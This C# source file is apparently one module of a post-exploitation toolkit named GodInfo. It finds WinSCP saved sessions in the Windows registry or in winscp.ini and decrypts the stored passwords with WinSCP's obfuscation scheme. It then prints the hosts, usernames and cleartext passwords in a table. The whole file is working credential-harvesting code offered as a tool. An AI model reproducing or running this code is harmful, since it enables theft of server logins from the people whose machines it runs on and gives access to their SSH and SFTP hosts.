using GodInfo.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace GodInfo.Commands
{
    public class WinSCPCredCommand : ICommand
    {
        private static readonly int PW_MAGIC = 0xA3;
        private static readonly char PW_FLAG = (char)0xFF;

        public struct ConnectionInfo
        {
            public string Host;
            public string UserName;
            public string RawPassword;
            public string Password;
        }

        private struct Flags
        {
            public char flag;
            public string remainingPass;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by WinSCP.");
            GetWinSCPCred();
        }

        public static void GetWinSCPCred()
        {
            Logger.TaskHeader("Hunting WinSCP", 1);
            
            // 首先尝试从注册表获取WinSCP凭据（安装版本）
            bool foundCredentials = GetCredentialsFromRegistry();
            
            // 如果注册表中没有找到凭据，尝试从配置文件获取（便携版本）
            if (!foundCredentials)
            {
                GetCredentialsFromConfigFile();
            }
        }

        public static bool CheckWinSCPCredExists()
        {
            // 检查注册表中是否存在WinSCP凭据
            string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            
            if (registryKey != null)
            {
                using (registryKey)
                {
                    if (registryKey.GetSubKeyNames().Length > 0)
                    {
                        return true;
                    }
                }
            }
            
            // 检查配置文件是否存在WinSCP凭据
            string configPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "winscp.ini");
                
            if (File.Exists(configPath))
            {
                return true;
            }
            
            return false;
        }

        private static bool GetCredentialsFromRegistry()
        {
            string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            
            if (registryKey == null)
            {
                Logger.WriteLine($"[-] WinSCP registry key not found: HKEY_CURRENT_USER\\{registry}");
                return false;
            }

            Logger.WriteLine($"[+] Found WinSCP registry key: HKEY_CURRENT_USER\\{registry}");
            
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            bool foundAnyCredentials = false;

            using (registryKey)
            {
                foreach (string sessionName in registryKey.GetSubKeyNames())
                {
                    using (var session = registryKey.OpenSubKey(sessionName))
                    {
                        if (session != null)
                        {
                            object hostnameObj = session.GetValue("HostName");
                            string hostname = (hostnameObj != null) ? hostnameObj.ToString() : "";
                            
                            if (!string.IsNullOrEmpty(hostname))
                            {
                                try
                                {
                                    object usernameObj = session.GetValue("UserName");
                                    object passwordObj = session.GetValue("Password");
                                    
                                    if (usernameObj != null && passwordObj != null)
                                    {
                                        string username = usernameObj.ToString();
                                        string rawPassword = passwordObj.ToString();
                                        string decryptedPassword = DecryptWinSCPPassword(hostname, username, rawPassword);
                                        
                                        connections.Add(new ConnectionInfo
                                        {
                                            Host = hostname,
                                            UserName = username,
                                            RawPassword = rawPassword,
                                            Password = decryptedPassword
                                        });
                                        
                                        foundAnyCredentials = true;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Logger.WriteLine($"[-] Error processing WinSCP session '{sessionName}': {ex.Message}");
                                }
                            }
                        }
                    }
                }
            }

            if (foundAnyCredentials)
            {
                Logger.PrintTableFromStructs(connections);
                return true;
            }
            
            Logger.WriteLine("[-] No WinSCP credentials found in registry.");
            return false;
        }

        private static bool GetCredentialsFromConfigFile()
        {
            string configPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "winscp.ini");
                
            if (!File.Exists(configPath))
            {
                Logger.WriteLine($"[-] WinSCP config file not found at: {configPath}");
                return false;
            }
            
            Logger.WriteLine($"[+] Found WinSCP config file: {configPath}");
            
            // 读取配置文件内容
            string[] lines;
            try
            {
                lines = File.ReadAllLines(configPath);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading WinSCP config file: {ex.Message}");
                return false;
            }
            
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            bool foundAnyCredentials = false;
            bool inSessionSection = false;
            string currentHost = "";
            string currentUsername = "";
            string currentPassword = "";
            
            foreach (string line in lines)
            {
                string trimmedLine = line.Trim();
                
                if (trimmedLine.StartsWith("[Sessions\\"))
                {
                    // 如果之前处理了一个会话，保存它的凭据
                    if (inSessionSection && !string.IsNullOrEmpty(currentHost) && 
                        !string.IsNullOrEmpty(currentUsername) && !string.IsNullOrEmpty(currentPassword))
                    {
                        string decryptedPassword = DecryptWinSCPPassword(currentHost, currentUsername, currentPassword);
                        
                        connections.Add(new ConnectionInfo
                        {
                            Host = currentHost,
                            UserName = currentUsername,
                            RawPassword = currentPassword,
                            Password = decryptedPassword
                        });
                        
                        foundAnyCredentials = true;
                    }
                    
                    // 开始新的会话
                    inSessionSection = true;
                    currentHost = "";
                    currentUsername = "";
                    currentPassword = "";
                }
                else if (inSessionSection)
                {
                    if (trimmedLine.StartsWith("HostName="))
                    {
                        currentHost = trimmedLine.Substring("HostName=".Length);
                    }
                    else if (trimmedLine.StartsWith("UserName="))
                    {
                        currentUsername = trimmedLine.Substring("UserName=".Length);
                    }
                    else if (trimmedLine.StartsWith("Password="))
                    {
                        currentPassword = trimmedLine.Substring("Password=".Length);
                    }
                }
            }
            
            // 处理最后一个会话
            if (inSessionSection && !string.IsNullOrEmpty(currentHost) && 
                !string.IsNullOrEmpty(currentUsername) && !string.IsNullOrEmpty(currentPassword))
            {
                string decryptedPassword = DecryptWinSCPPassword(currentHost, currentUsername, currentPassword);
                
                connections.Add(new ConnectionInfo
                {
                    Host = currentHost,
                    UserName = currentUsername,
                    RawPassword = currentPassword,
                    Password = decryptedPassword
                });
                
                foundAnyCredentials = true;
            }
            
            if (foundAnyCredentials)
            {
                Logger.PrintTableFromStructs(connections);
                return true;
            }
            
            Logger.WriteLine("[-] No WinSCP credentials found in config file.");
            return false;
        }

        private static Flags DecryptNextCharacterWinSCP(string passwd)
        {
            Flags flag = new Flags();
            string bases = "0123456789ABCDEF";

            int firstVal = bases.IndexOf(passwd[0]) * 16;
            int secondVal = bases.IndexOf(passwd[1]);
            int added = firstVal + secondVal;
            flag.flag = (char)(((~(added ^ PW_MAGIC) % 256) + 256) % 256);
            flag.remainingPass = passwd.Substring(2);
            return flag;
        }

        private static string DecryptWinSCPPassword(string host, string userName, string passWord)
        {
            var clearPwd = string.Empty;
            char length;
            string unicodeKey = userName + host;
            Flags flag = DecryptNextCharacterWinSCP(passWord);

            int storedFlag = flag.flag;

            if (storedFlag == PW_FLAG)
            {
                flag = DecryptNextCharacterWinSCP(flag.remainingPass);
                flag = DecryptNextCharacterWinSCP(flag.remainingPass);
                length = flag.flag;
            }
            else
            {
                length = flag.flag;
            }

            flag = DecryptNextCharacterWinSCP(flag.remainingPass);
            flag.remainingPass = flag.remainingPass.Substring(flag.flag * 2);

            for (int i = 0; i < length; i++)
            {
                flag = DecryptNextCharacterWinSCP(flag.remainingPass);
                clearPwd += flag.flag;
            }
            
            if (storedFlag == PW_FLAG)
            {
                if (clearPwd.Length >= unicodeKey.Length && clearPwd.Substring(0, unicodeKey.Length) == unicodeKey)
                {
                    clearPwd = clearPwd.Substring(unicodeKey.Length);
                }
                else
                {
                    clearPwd = "";
                }
            }
            
            return clearPwd;
        }
    }
} 